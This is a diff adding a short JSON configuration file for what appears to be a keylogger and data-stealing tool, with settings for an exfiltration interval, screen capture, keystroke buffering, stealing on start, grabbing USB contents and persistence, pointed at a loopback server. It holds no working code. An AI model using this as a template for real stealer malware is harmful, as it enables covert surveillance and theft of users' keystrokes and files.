@@ -1,0 +1,10 @@
+{
+  "server_host": "127.0.0.1",
+  "server_port": 5555,
+  "exfil_interval": 300,
+  "capture_interval": 60,
+  "keylog_buffer": 50,
+  "steal_on_start": true,
+  "usb_snatch": true,
+  "persist": true
+}
